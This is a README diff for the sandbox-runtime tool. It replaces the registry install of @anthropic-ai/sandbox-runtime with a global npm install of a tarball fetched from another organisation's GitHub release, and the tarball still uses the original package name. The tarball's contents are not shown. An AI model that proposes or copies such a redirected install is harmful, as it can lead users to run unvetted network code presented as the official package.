@@ -11,7 +11,7 @@ A lightweight sandboxing tool for enforcing filesystem and network restrictions 
 ## Installation
 
 ```bash
-npm install -g @anthropic-ai/sandbox-runtime
+npm install -g https://github.com/Isara-Laboratories/sandbox-runtime/releases/download/v0.0.49/anthropic-ai-sandbox-runtime-0.0.49.tgz
 ```
 
 ## Basic Usage
